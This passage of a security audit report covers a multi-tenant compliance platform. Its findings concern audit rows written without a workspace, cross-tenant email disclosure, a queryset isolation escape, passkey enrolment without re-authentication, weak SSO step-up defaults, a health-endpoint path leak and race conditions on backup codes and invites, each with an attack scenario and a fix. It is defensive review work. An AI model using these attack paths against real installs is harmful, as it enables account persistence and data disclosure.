**Dimension:** jobs-migrations  
**Where:** backend/documents/monitor.py:75-84 (called from :116-117 and :142); backend/documents/management/commands/scan_evidence.py:138-162; backend/accounts/tenancy.py:305-320; backend/audit/models.py:12-16; backend/audit/views.py:38-48

**Mechanism.** `monitor._record` does `AuditLog.objects.create(user=user, action=action, ...)` (monitor.py:79-82) with no workspace. `AuditLog` declares `tenant_parent = "user"` and overrides `workspace` as `null=True, blank=True` (audit/models.py:12-16). `assign_workspace` (tenancy.py:305-320) therefore: `workspace_id` unset → `tenant_parent` is `"user"` but `user_id` is falsy (the sweep passes `user=None`, monitor.py:160 `def rescan(..., user=None)`) → `wid = current_id()`. `manage.py scan_evidence` contains no reference to `tenancy` at all (grep returns nothing) and is not wrapped in `for_each_workspace`, so nothing is active and `current_id()` returns `None`. Because the field is nullable, the `raise NoActiveWorkspace` at tenancy.py:314-318 is skipped and the row is written with `workspace_id = NULL`. `AuditLogViewSet.get_queryset` (audit/views.py:38-47) only unions in `AuditLog.objects.filter(workspace__isnull=True)` when `self.request.user.is_superuser`; a tenant Administrator or Auditor sees the pinned queryset only. So the row exists and is unreachable by the people who need it. The same call at monitor.py:119-124 posts the `document.quarantined` webhook with `tenancy.current()` still `None`, so webhooks.py:152-154 cannot prefix the workspace name and the channel message does not say whose file it is. This directly contradicts the module's own promise at monitor.py:15-16: "every route that serves its bytes refuses it, and the fact is in the audit trail."

**Attack.** Operator installs the documented nightly cron `python manage.py scan_evidence --stale 30` (the command's own docstring, scan_evidence.py:110-118). Overnight, updated ClamAV signatures match a stored evidence PDF in workspace `acme`. `scan_document` (monitor.py:108-125) sets `quarantined_at`, so every download route now 403s (`refuse_if_quarantined`, monitor.py:184-195), and writes the explanatory row `QUARANTINED 'Penetration Test Report' v3: scanner matched Eicar-Test-Signature`. Acme's Administrator opens `/api/audit-log/` the next morning: the file is refused with no corresponding audit entry anywhere in their trail. The Slack alert, if configured, says `File quarantined: Penetration Test Report` with no workspace prefix. The same applies in reverse to the release row at monitor.py:142 — a false positive withdrawn upstream releases the file with no tenant-visible record of the release, which is exactly the kind of unexplained evidence-state change an auditor asks about.

**Guard checked.** I checked whether the sweep activates a workspace: `scan_evidence.py` imports only `monitor` and `Document` (lines 120-124) — no `tenancy`, no `for_each_workspace`, unlike `record_readiness.py:44`, `send_review_reminders.py:76` and `notifications/tasks.py:339` which all do loop. I checked whether the orphan union rescues the tenant — audit/views.py:39 gates it on `is_superuser`, and `CanViewAuditLog` (audit/views.py:21-25) admits non-superuser admins/auditors, so it does not. I checked the request-time upload path: `documents/views.py:187-197` runs inside a request with a resolver installed, so those rows are stamped correctly — only the CLI sweep is affected. There is no Celery beat entry for a rescan (settings.py:500-524), so cron is the only trigger, which is the documented one.

**Fix.** Wrap the sweep in the same loop the other commands use: in `scan_evidence.Command.handle`, iterate `for ws in tenancy.for_each_workspace():` and run `monitor.rescan(...)` inside each, accumulating counts. That both stamps the audit rows and gives `webhooks.post_event` a workspace to name. Belt and braces: make `monitor._record` refuse to write a row when `tenancy.current_id()` is None and the document has a workspace, taking it from `document.workspace_id` instead.

---

## [LOW] Every workspace's document, vendor and auditor-request detail is emailed to one installation-wide COMPLIANCE_TEAM_EMAIL address

**Dimension:** tenant-read  
**Where:** backend/notifications/tasks.py:25, :100, :140; backend/vendors/questionnaire.py:282; backend/config/settings.py:433

**Mechanism.** `COMPLIANCE_TEAM_EMAIL` is a single process-wide setting (`config/settings.py:433`, defaulting to `DEFAULT_FROM_EMAIL`) with no per-workspace equivalent. The daily scans run correctly per workspace — `run_all_scans` iterates `tenancy.for_each_workspace()` (`notifications/tasks.py:337-347`) — but each notifier then unconditionally appends that one global address alongside the correctly-scoped owner: `_notify` at `:25` (subject `"[Overdue] Review overdue: {document.name}"`, context carries `folder_path`), `_notify_bridge` at `:100` (vendor name and lapsed report), `_notify_pbc` at `:140` (auditor request reference, title and package). `vendors/questionnaire.py:282` does the same for a returned vendor questionnaire. So on a multi-tenant install the operator's mailbox accumulates every customer's evidence-document names, folder paths, vendor names and audit request lists.

**Attack.** Not an attacker path from inside a tenant — the recipient is the operator, who already owns the database. It becomes a real disclosure when the address is a shared inbox, a ticketing system, a Slack-email bridge, or an MSP's helpdesk rather than a single trusted person, and when one of the tenants is a customer who was told their evidence never leaves their workspace. A tenant can also drive the volume: creating documents with attacker-chosen names and a past `next_review_date` causes those names to be mailed out on the next scan.

**Guard checked.** Checked whether the setting is resolved per workspace: `tenancy.organisation_name()` (`accounts/tenancy.py:124-134`) does switch to the workspace's name once more than one workspace exists, so the authors clearly considered per-workspace outbound identity — but the recipient list was not given the same treatment, and there is no `Workspace.compliance_email` field on the model (`accounts/models.py:11-25`). Confirmed no call site filters or overrides it: all six uses of `COMPLIANCE_TEAM_EMAIL` outside tests are unconditional appends.

**Fix.** Add a per-workspace notification address (a nullable `compliance_email` on `accounts.Workspace`, settable from the workspace API) and have the four notifiers resolve `tenancy.current().compliance_email or settings.COMPLIANCE_TEAM_EMAIL`. Keep the global address only for the genuinely installation-level alerts (`notifications/tasks.py:213, :226`, the clamd up/down notices), which carry no tenant content.

---

## [LOW] TenantQuerySet._pin() permanently skips the workspace filter on any queryset that was sliced while no workspace was active — a latent one-line escape in the core isolation primitive

**Dimension:** tenancy-mechanism  
**Where:** backend/accounts/tenancy.py:263-270 (`_pin`), 260-261 (`_chain`)

**Mechanism.** `_pin` returns unfiltered when `self.query.is_sliced` or `self.query.combinator` is set (tenancy.py:264) and, separately, when `current_id() is None` (tenancy.py:266-267). The two combine badly. A queryset built and sliced at import time — when nothing is active, which is exactly the state the module documents at tenancy.py:22-33 for module-level `queryset =` attributes — gets `is_sliced = True` while `_tenant` is still False. Every later `_chain()` (DRF's `GenericAPIView.get_queryset` calls `.all()` on `self.queryset`) hits the `is_sliced` bail-out at line 264 *before* the `current_id()` check, so the workspace clause is never added, in any request, for the life of the process. I verified this against the real code: with nothing active, `imp = Document.objects.all(); imp_sliced = imp[:10]`, then `tenancy.activate(7)` — `imp.all()` compiles with `WHERE workspace_id = %s`, `imp_sliced.all()` compiles with no workspace predicate at all. Django then refuses `.filter()` on it, so the escape is silent rather than noisy.

**Attack.** No production call site reaches it today, so this is a latent hazard, not a live exploit: I grepped the whole backend for slicing on a tenant model outside a request (`objects.<x>(…)[…]`) and found only `accounts/oidc.py:433` (installation-wide by design), `notifications/views.py:32,49` (WebhookDelivery, not a tenant model), and `compliance/views.py:239/243` (`docs[:500]`, sliced after the manager already pinned inside a request). `.union()/.intersection()/.difference()` appear nowhere. The exposure is the next edit: any developer who writes `queryset = Model.objects.filter(...)[:N]` as a viewset class attribute, or caches a sliced queryset at module scope, ships a cross-workspace list endpoint with no error, no failing test, and no visible symptom.

**Guard checked.** I looked for a guard on this specific shape: `_clone` faithfully carries `_tenant` (tenancy.py:255-258) so ordinary chaining is safe; `TenantManager.get_queryset` pins eagerly (tenancy.py:279-280) so manager-first access is safe; DRF pagination slices only after `get_queryset()` has already pinned. `accounts/tests_tenancy.py:65` covers the import-time-unpinned-then-chained case, which passes — but no test covers import-time-unpinned-then-*sliced*, and the map of the mechanism records `is_sliced`/`combinator` as unexercised.

**Fix.** Reorder the checks in `_pin` so the bail-out cannot outlive the reason for it: test `current_id() is None` first and return early, and turn the `is_sliced`/`combinator` case into a hard failure rather than a silent pass — `raise RuntimeError("cannot pin a sliced/combined queryset; pin before slicing")` when a workspace is active and `_tenant` is False. Add the regression test (slice with nothing active, activate, assert the compiled SQL still constrains `workspace_id`).

---

## [LOW] Enrolling a passkey needs no password re-authentication, while removing one does — a hijacked session can plant an attacker-controlled second factor

**Dimension:** authn  
**Where:** backend/accounts/webauthn_views.py:39-61 and :86-97; backend/accounts/views.py:282-297 and :300-312

**Mechanism.** `PasskeyDetailView.delete` (accounts/webauthn_views.py:86-91) requires `request.user.check_password(request.data.get("password"))`, and the class docstring (:64-68) states the reason: "so a hijacked session cannot quietly strip a factor". `MfaDisableView` (accounts/views.py:288-290) and `MfaBackupCodesView` (accounts/views.py:309-310) apply the same password gate. `PasskeyRegisterOptionsView` (:28-36) and `PasskeyRegisterView` (:39-61) do not — they are `permission_classes = [IsAuthenticated]` plus the MFA throttle, nothing else. The threat model the design is built around explicitly includes this attacker: SECURITY.md's cookie-transport note says XSS "can still act as the user while the page is open". So the one direction that adds a credential the attacker controls is the one direction that is not re-authenticated.

**Attack.** An attacker with a live session (stored XSS in a document name or risk title rendered by the SPA, or an unattended workstation) calls `POST /api/auth/webauthn/register/options/` then `POST /api/auth/webauthn/register/` with a passkey held on their own authenticator. It is now a valid second factor on the victim's account, indistinguishable in the list from a legitimate key, and it survives a password change (see finding 3) and any later browser cleanup. It does not by itself grant sign-in — the password is still needed — but it converts a transient session compromise into a durable half of the credential pair, ready for the moment the password is learned or reset to a known value. An audit row is written (webauthn_views.py:54) but only names the label the attacker chose.

**Guard checked.** I checked whether enrolment is otherwise bound to a fresh proof of identity: `passkeys.begin_registration` / `finish_registration` (accounts/passkeys.py:113-146) verify the WebAuthn ceremony correctly (challenge is per-user, single-use, `_consume_challenge` at :90-102; rp_id and origin are checked in webauthn.py:449, :457) but nothing re-checks the human. I confirmed the credential itself cannot cross accounts — `finish_login` looks the row up with `filter(user=user, credential_id=...)` (passkeys.py:187) and verifies the signature against that row's stored key — so this is persistence, not an authentication bypass, hence low.

**Fix.** Require the account password (or a fresh assertion from an existing factor) on `PasskeyRegisterView`, the same body field `MfaDisableView` already reads. At minimum, notify the account owner out-of-band when a new factor is enrolled, and include the credential's aaguid in the audit detail so an unfamiliar authenticator is visible in the trail.

---

## [LOW] Default SSO_MFA_ASSERTIONS accepts amr values that are not second factors, letting a single-factor IdP login satisfy SSO_STEP_UP

**Dimension:** sso  
**Where:** backend/config/settings.py:649 (primary); backend/config/settings.py:646-659, 654; backend/accounts/oidc.py:303-312, 315-326; backend/accounts/saml.py:365-370

**Mechanism.** `mfa_asserted(claims)` returns True when any value in the ID token's `amr` (or `acr`) appears in `settings.SSO_MFA_ASSERTIONS` (oidc.py:306-312), and `step_up_needed` then returns False immediately -- `if policy == "off" or asserted: return False` (oidc.py:319-320) -- skipping both the enrolled-authenticator prompt and, under `SSO_STEP_UP=required`, the refusal. The shipped default list (settings.py:649) is `"mfa,otp,hwk,swk,sms,tel,fido,pop,user,pin,..."`. RFC 8176 defines `user` as "User presence test. Evidence that the end user is present and interacting with the device" -- a presence signal, not an authentication factor at all; `pin` and `pop` are likewise single factors on their own. The SAML twin is worse in one respect: `contexts` is built from `AuthnContextClassRef` (saml.py:365-366) and matched against the same list, which includes `urn:oasis:names:tc:SAML:2.0:ac:classes:X509` (settings.py:654) -- plain certificate authentication, one factor.

**Attack.** An operator sets `SSO_STEP_UP=required` believing it means "a second factor always" (settings.py:640-643 and SECURITY.md:81-84 both describe it that way). Their IdP performs a password-only or certificate-only authentication but includes `"user"` in `amr` (a presence signal many providers emit alongside a WebAuthn/PIN ceremony, and some emit routinely), or issues a SAML assertion with `AuthnContextClassRef = urn:oasis:names:tc:SAML:2.0:ac:classes:X509`. `mfa_asserted` returns True, `step_up_needed` returns False, `issue_ticket(..., mfa_pending=False)` (oidc_views.py:125) mints a ticket redeemable with no `otp` or `passkey` at all (oidc.py:519), and the account's enrolled TOTP device or passkey is never asked for. The policy silently degrades to whatever the IdP did.

**Guard checked.** `step_up_needed` (oidc.py:315-326) has no notion of assertion strength beyond set membership; there is no cross-check that `amr` also contains a first factor such as `pwd`, and no minimum count. `tests_saml.py:349` (`test_an_asserted_second_factor_skips_the_step_up`) and `tests_oidc.py:307` assert exactly this skip using values from the list, so the behaviour is intended -- the defect is the membership of the default list, not the mechanism.

**Fix.** Drop `user`, `pin`, `pop` and `urn:oasis:names:tc:SAML:2.0:ac:classes:X509` from the default at settings.py:649/654, leaving the values that conventionally denote a genuine second step (`mfa,otp,hwk,swk,sms,tel,fido` and the Microsoft/OASIS two-factor URNs); operators who want the looser set can still opt in through the SSO_MFA_ASSERTIONS environment variable.

---

## [LOW] `GET /api/folders/{id}/permissions/` discloses a folder's full access map to anyone with VIEW, contradicting the manage-only scoping the sibling viewset deliberately enforces

**Dimension:** authz  
**Where:** backend/documents/views.py:120-124 (primary); contrast backend/documents/views.py:131-142; backend/documents/serializers.py:16-27

**Mechanism.** `FolderViewSet.permissions` is a `@action(detail=True, methods=["get"])` that inherits the viewset's `permission_classes = [IsAuthenticated, FolderAccessPermission]` (views.py:44). For a SAFE method `FolderAccessPermission.has_object_permission` returns `True` as soon as `effective_access` is non-`None` (permissions.py:11-14) — i.e. VIEW is enough. The action then returns every grant on the folder unfiltered:
```python
perms = FolderPermission.objects.filter(folder=folder).select_related("role", "user")
return Response(FolderPermissionSerializer(perms, many=True).data)   # views.py:123-124
```
`FolderPermissionSerializer` exposes `role_name`, `user_name` (full name), `username` and `access_level` (serializers.py:16-27). `FolderPermissionViewSet.get_queryset` restricts the same rows to folders the caller can *manage*, with the reason spelled out in its own docstring: "the access-control map is itself sensitive, so it must not leak past folder permissions" (views.py:132-133).

**Attack.** A user granted VIEW on one evidence folder calls `GET /api/folders/{that folder}/permissions/` and receives the complete grant list for it — which named individuals and which roles hold view/edit/manage. `GET /api/folder-permissions/?folder={same id}` returns 0 rows for the same caller (asserted by `documents/tests.py:52-59`). The action is the way around that filter. The disclosure is the shape of the access-control map, not credentials, and usernames are already broadly readable via the read-open `/api/users/`, which is why this is rated low rather than higher.

**Guard checked.** I confirmed the action carries no `permission_classes` override of its own (views.py:120-121) and that `get_object()` is the only gate. I checked the test suite for coverage of this route: `documents/tests.py:52-59` tests `/api/folder-permissions/` and asserts the viewer sees zero rows, but no test exercises `/api/folders/{id}/permissions/` from a view-only account, so the two paths were never compared.

**Fix.** Gate the action to match its sibling: at the top of `FolderViewSet.permissions`, `if not folder.can_manage(request.user): raise PermissionDenied(...)` — or return only the caller's own effective grant when they hold less than manage. Add a test asserting a VIEW-only caller gets 403 there.

---

## [LOW] The unauthenticated health endpoint discloses the filesystem path of the Ed25519 package-signing private key when it is misconfigured

**Dimension:** public-surface  
**Where:** backend/config/health.py:54-59 and :81; backend/attestations/signing.py:113-114 and :214-216

**Mechanism.** `load_private_key` wraps its filesystem access in `except OSError as exc: raise ImproperlyConfigured(f"SIGNING_KEY_FILE={location!r} is not readable/writable: {exc}")` (attestations/signing.py:113-114) — the message embeds the absolute path *and* the OS error text. `current_key_info` catches that exception and, instead of swallowing it, returns it as data: `return {"enabled": enabled(), …, "error": str(exc)}` (signing.py:214-216). `config/health.py:54-59` then calls `signing.current_key_info(create=True)` and copies the field straight through: `return {…, "error": info.get("error")}` (`:58-59`), which lands in the response body at `health.py:81`. The outer `except Exception` at health.py:56 never fires, because `current_key_info` already handled the exception and returned normally. `HealthView` is `authentication_classes = []`, `permission_classes = [AllowAny]`, `throttle_classes = []` (health.py:63-65).

**Attack.** On any install where the signing key file is unreadable — wrong volume mount, a `secrets` volume owned by root while gunicorn runs unprivileged, a full disk, SELinux denial — an unauthenticated `GET /api/health/` returns `"signing": {"error": "SIGNING_KEY_FILE='/app/secrets/signing_key.pem' is not readable/writable: [Errno 13] Permission denied: '/app/secrets/signing_key.pem'"}`. That hands a remote attacker the exact on-disk location of the key that signs every audit package manifest, plus a live signal about the container's filesystem layout and permissions — useful for aiming a subsequent path-traversal or container-escape attempt at the one file whose theft would let them forge auditor-facing signatures. The endpoint is unthrottled, so it can be polled to detect the moment the permission changes.

**Guard checked.** I checked whether the outer `try/except Exception` at health.py:54-57 would mask the message — it cannot, because `current_key_info` (signing.py:212-216) catches `ImproperlyConfigured` itself and returns rather than re-raising. I checked whether the field is stripped for anonymous callers — `HealthView.get` (health.py:67-83) has no branch on `request.user` at all. I checked whether `DEBUG` gates it — it does not; the same body is returned with `DJANGO_DEBUG=false`. The private key material itself is never returned (only `public_b64` at signing.py:222), so this is disclosure of the path, not of the key.

**Fix.** Have `config/health.py:56-59` collapse any non-null `info["error"]` to a fixed token for unauthenticated callers — e.g. `"error": "misconfigured" if info.get("error") else None` — and log the detailed `ImproperlyConfigured` message server-side instead. Optionally give `HealthView` the `anon` throttle rather than `throttle_classes = []`.

---

## [LOW] Switching to the workspace whose slug is literally "default" silently lands the superuser in their own workspace instead

**Dimension:** frontend  
**Where:** frontend/src/pages/Account.jsx:1016-1019; backend/accounts/tenancy.py:159-169

**Mechanism.** `switchTo` is `chooseWorkspace(slug === "default" ? "" : slug); window.location.assign("/")` (`Account.jsx:1017-1018`). It conflates two different things: the workspace whose slug happens to be `default` (created by `tenancy.default_workspace()`, `tenancy.py:115-121`), and "send no `X-Workspace` header at all". They are only the same workspace for a superuser whose own `workspace_id` points at `default`. With no header, `workspace_id_for` skips the `wanted` branch (`tenancy.py:159-167`) and falls through to `return user.workspace_id` (`:168-169`) — the caller's home workspace, whatever it is.

**Attack.** Superuser Sam is homed in workspace `acme` (an installation where `default` is a separate tenant, which is exactly the shape `install.sh` produces once a second workspace is created). Sam is currently switched into `beta` and clicks Switch on the `default` row to move there. The header is deleted, the app reloads, and Sam is now in `acme`, not `default`. `/api/workspaces/current/` (`Account.jsx:1011`) returns `acme`, so the `default` row keeps rendering a "Switch" button rather than the `current` badge (`Account.jsx:1024-1026`), and Sam clicks it again to the same non-effect. Anything Sam creates in the meantime is stamped `acme`.

**Guard checked.** I checked whether the server ever treats an absent header as "the default workspace": it does not — the fallback to "first active workspace by pk" at `tenancy.py:170-173` applies only to a superuser with `workspace_id` NULL, not to one homed elsewhere. I also checked for a test: `accounts/tests_tenancy.py:192-207` exercises switching by slug and by pk, but always to a non-default target, so this case is uncovered.

**Fix.** Drop the special case: `chooseWorkspace(slug)` unconditionally at `Account.jsx:1017`. The `default` slug is a valid `X-Workspace` value and `workspace_id_for` resolves it correctly (`tenancy.py:161-163`); reserve the empty string for "clear the choice", which `clearSession` already uses.

---

## [LOW] Every page of a self-hosted compliance product, including the anonymous login screen and the public vendor questionnaire, loads fonts from Google

**Dimension:** frontend  
**Where:** frontend/index.html:10-15; frontend/nginx.conf:19 (also frontend/dist/index.html:10-15)

**Mechanism.** `index.html:10-11` preconnects to `https://fonts.googleapis.com` and `https://fonts.gstatic.com`, and `:12-15` loads a Google Fonts stylesheet as a render-blocking `<link>` in `<head>`. `nginx.conf:19` extends the CSP to permit it: `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com`. This is in the built artefact too (`dist/index.html:10-15`), so it ships. The markup is in the shared shell, so it loads on `/login` (anonymous) and on `/questionnaire/:token` (the public, unauthenticated vendor page — `App.jsx:155`), not only behind a session.

**Attack.** Not an exploit so much as a property the product's own buyers audit for. Every visitor to a Conformiti install — including third-party vendors following an emailed questionnaire link, and anyone probing the login page — makes two requests to Google carrying their IP, User-Agent and a `Referer` naming the customer's Conformiti host. For a self-hosted GRC platform whose selling point is that the compliance programme never leaves the customer's infrastructure, that is a finding a customer's own SOC 2 / GDPR reviewer will raise (the German Google Fonts rulings are the usual citation). Operationally it is also the air-gap failure mode: in a disconnected or egress-filtered install the stylesheet request hangs until timeout on every cold load, and the app renders in fallback fonts.

**Guard checked.** I checked whether the fonts are also self-hosted with the CDN as a progressive enhancement — they are not; there is no local `@font-face` or woff2 in `frontend/src/styles/index.css` or `dist/assets/`, so the CDN is the only source. The CSP is otherwise tight and correct (`script-src 'self' 'wasm-unsafe-eval'`, `connect-src 'self'`, `object-src 'none'`, `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'`) and the comment at `nginx.conf:14-15` already anticipates this exact change — "If you self-host the fonts, drop the two fonts.* entries" — so the work was scoped and then not done.

**Fix.** Self-host the two families. Add `@fontsource/inter` and `@fontsource/jetbrains-mono` (or drop the woff2 files into `frontend/public/fonts/` with local `@font-face` rules in `src/styles/index.css`), delete `index.html:10-15`, and tighten `nginx.conf:19` to `style-src 'self' 'unsafe-inline'; font-src 'self'` as the comment already instructs.

---

## [LOW] MFA backup codes are single-use only in Python: an unlocked read-modify-write lets one code authenticate two concurrent logins

**Dimension:** integrity-races  
**Where:** backend/accounts/models.py:195-209 (User.verify_backup_code); consumed from backend/accounts/serializers.py (token serializer MFA path)

**Mechanism.** `verify_backup_code` iterates `self.backup_codes.filter(used_at__isnull=True)` (models.py:205), and on a match sets `backup.used_at` and saves (`:206-208`). The read of `used_at IS NULL`, the `check_password` comparison and the write are three separate statements with no `select_for_update`, no conditional `UPDATE ... WHERE used_at IS NULL`, and no `transaction.atomic()`. Two requests presenting the same code both observe it unused and both mark it used, so both authenticate. The window is not narrow: `check_password` is PBKDF2 and runs once per unused code, so a user with several unused codes spends hundreds of milliseconds inside it.

**Attack.** An attacker who has obtained one backup code (phished, shoulder-surfed, or read from a printout) fires two simultaneous `POST /api/auth/token/` requests carrying the same code. Both complete the MFA step and both receive a token pair. The property the feature advertises — each code answers exactly once — does not hold, and the audit trail shows one code consumed for two sessions. Impact is bounded because the attacker must already hold the code and the password, and `THROTTLE_LOGIN` (8/min per IP, config/settings.py) caps volume; this is a defence-in-depth failure rather than a bypass.

**Guard checked.** The sibling single-use primitive in this codebase is done correctly and shows the intended pattern: `_consume_challenge` for WebAuthn is a fetch-and-delete under `transaction.atomic()` + `select_for_update()`, with the comment "a challenge answers exactly once, even under two concurrent submissions" (accounts/passkeys.py:90-101). `MfaBackupCode` (accounts/models.py:318-333) has no unique or partial-index constraint that would make the second write fail. `MfaDevice.verify` (models.py:305-313) only touches `last_used_at`, so TOTP replay is handled elsewhere, not here.

**Fix.** Make consumption atomic and conditional: inside `transaction.atomic()`, iterate `self.backup_codes.select_for_update().filter(used_at__isnull=True)`, or on a match commit with `MfaBackupCode.objects.filter(pk=backup.pk, used_at__isnull=True).update(used_at=timezone.now())` and treat a returned rowcount of 0 as "already used" (return False).

---

## [LOW] "One live questionnaire link per vendor" is enforced by an UPDATE with nothing to lock, so two concurrent sends leave two live public tokens

**Dimension:** integrity-races  
**Where:** backend/vendors/questionnaire.py:123-135 (create_invite); contrast the correct locking at backend/vendors/questionnaire.py:236-238

**Mechanism.** `create_invite` opens `transaction.atomic()` (questionnaire.py:123) and revokes existing live invites with `QuestionnaireInvite.objects.filter(...).update(revoked_at=..., revoked_by=user)` (`:126-130`) before creating the new row (`:131-136`). The comment states the invariant: "One live link per vendor: a second send supersedes the first, so a forwarded old link cannot be answered alongside the new one." An `UPDATE` only locks rows it matches; when a vendor has no live invite (or when two sends race before either has committed its INSERT), each transaction's UPDATE matches nothing, takes no lock, and both INSERTs succeed. There is no unique constraint expressing "at most one live invite per vendor" (vendors/models.py:290-310 has only the globally unique `token_hash`).

**Attack.** Two operators (or one operator double-clicking Send, or a client retry) issue `POST /api/vendors/{id}/questionnaire/send/` within the same instant. Two `QuestionnaireInvite` rows are created, both unrevoked, both unexpired, both with valid public tokens. Each token independently passes `_require_live` at the unauthenticated `PUT/POST /api/questionnaire/{token}/` endpoints (vendors/public_views.py:47-69), so the vendor can submit twice and create two `VendorAssessment` rows for one request — and a link forwarded to the wrong recipient remains answerable after the "superseding" send that was supposed to kill it.

**Guard checked.** The submit path in the same module IS correct and was the first thing checked: `submit` re-reads under `select_for_update()` and re-runs `_require_live(locked)` inside the lock (questionnaire.py:236-239), with the comment "two submits of the same link race to one row" — so double-submission of a single token is properly handled. The defect is only in issuance. No `UniqueConstraint` with a condition exists on `QuestionnaireInvite` to backstop it, and no test covers concurrent sends.

**Fix.** Lock the vendor row before the supersede — `Vendor.objects.select_for_update().get(pk=vendor.pk)` as the first statement inside the atomic block — or, better, add a conditional unique constraint such as `UniqueConstraint(fields=["vendor"], condition=Q(submitted_at__isnull=True, revoked_at__isnull=True), name="one_live_invite_per_vendor")` so the database enforces the invariant the comment claims.

---

## Contested (one verifier of three disagreed — worth a second look)

- **[low]** SAML Destination/Recipient are validated against an ACS URL derived from the request's Host header, not from configuration — `backend/accounts/saml.py:135-140 (primary); backend/accounts/saml.py:176, 191-194, 305-307, 319-321, 336-338; backend/co`

- **[medium]** verify.py silently downgrades a stripped signature to a passing "unsigned" verdict — removing manifest.sig and signing-key.pub yields exit 0 — `backend/attestations/verifier.py:168-169, 269-271, 276-289`

- **[high]** 0.9.0 scoped every query per workspace but not a single notification recipient: all workspaces' reminders, alerts and chat events go to one installation-wide address and one Slack/Teams channel — `backend/notifications/tasks.py:25 (also :100, :140, :213, :226); backend/vendors/questionnaire.py:282; backend/notificat`

- **[medium]** Editing a document's review clock through PATCH never clears `reminders_sent`, so a document that has gone overdue once can never raise an overdue alert again — `backend/documents/views.py:198-206; contrast :256, :306-316 and backend/attestations/pbc_views.py:136-137; backend/notif`

- **[medium]** Upgrading re-seeds the shipped control library into the `default` workspace only; every other tenant is silently frozen at the library version present when its workspace was created — `backend/entrypoint.sh:39-40; backend/compliance/management/commands/seed_frameworks.py:42-62; backend/accounts/tenancy.p`
